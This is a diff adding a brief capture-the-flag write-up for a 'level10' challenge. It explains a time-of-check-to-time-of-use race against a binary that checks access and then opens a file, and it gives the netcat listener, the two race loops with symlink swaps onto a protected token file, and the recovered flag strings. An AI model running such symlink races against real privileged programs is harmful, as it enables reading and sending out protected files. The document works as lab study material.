@@ -1,0 +1,9 @@
+We have 2 files: level10 and token
+We do decompiler in level10 we can see that check if the ip with the port 6969 exist So what I do it’s opening my ip in port 6969 with  command nc -lk 6969
+Next step we see that the code check if the user has access and after opening so the trick it’s to : link /tmp/file => /tmp/file2 (we have the right to file so we bypass access) and after link /tmp/file => /home/user/level10/token
+So I run 2 scripts at the same time for that one moment the window between access and open will be enough to have the changes. (Time of check to time of use (TOCTTOU) vulnerabilities)
+The script is: while  [ 1 ]; do ./level10 /tmp/file 10.0.0.45; done for running ./level10
+And : while  [ 1 ]; do sh /tmp/c; done with /tmp/c => rm /tmp/file && ln -s /home/user/level10/token /tmp/file && rm /tmp/file && ln -s /tmp/file2 /tmp/file 
+We create /tmp/file and /tmp/file2 and we run the script at the same time
+I can receipt the content of token with my port listening: Su flag10: woupa2yuojeeaaed06riuj63c
+Getflag=feulo4b72j7edeahuete3no7c
